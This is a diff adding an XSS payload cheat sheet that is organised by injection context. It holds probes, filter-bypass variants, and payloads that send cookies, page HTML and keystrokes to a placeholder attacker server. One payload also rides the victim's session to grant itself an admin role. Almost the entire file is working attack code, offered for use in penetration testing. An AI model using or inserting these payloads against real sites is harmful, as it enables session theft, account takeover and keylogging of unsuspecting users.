@@ -1,0 +1,42 @@
+# XSS — manual payload reference
+# Step 1: inject a unique marker, find it, see how it's encoded -> pick the context below.
+
+## Probe (hits several contexts at once)
+wzq'"><svg/onload=confirm(1)>wzq
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/`/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+
+## By context
+# HTML body
+<img src=x onerror=alert(document.domain)>
+<svg onload=alert(document.domain)>
+# Attribute value ( "> breaks out )
+"><svg onload=alert(document.domain)>
+# Inside a JS string
+';alert(document.domain)//
+</script><img src=x onerror=alert(1)>
+# JS template literal
+${alert(document.domain)}
+# href / URL sink
+javascript:alert(document.domain)
+
+## Filter / WAF bypass
+<svg/onload=alert`1`>
+<img src=x onerror=alert(1)>
+<img src=x OnErRoR=alert(1)>
+<a href="jaVaScRipT:alert(1)">x</a>
+<svg><script>alert&#40;1&#41;</script>
+
+## Session / data theft  (replace HOST:PORT with your catch-server)
+<script>new Image().src='http://HOST:PORT/c?'+document.cookie</script>
+<script>fetch('http://HOST:PORT/x?d='+btoa(document.cookie))</script>
+<script>fetch('http://HOST:PORT/dom?d='+btoa(document.body.innerHTML))</script>
+# Act as the victim (HttpOnly cookie you can't read — just use the session):
+<script>fetch('/api/user/update',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:'{"role":"admin"}'})</script>
+
+## Blind / stored beacon + keylogger
+<script>new Image().src='http://HOST:PORT/blind?u='+encodeURIComponent(location)</script>
+<script>document.onkeypress=e=>new Image().src='http://HOST:PORT/k?'+e.key</script>
+
+## DOM (no server round-trip)
+http://app/#<img src=x onerror=alert(document.domain)>
+http://app/?q=<img src=x onerror=alert(1)>
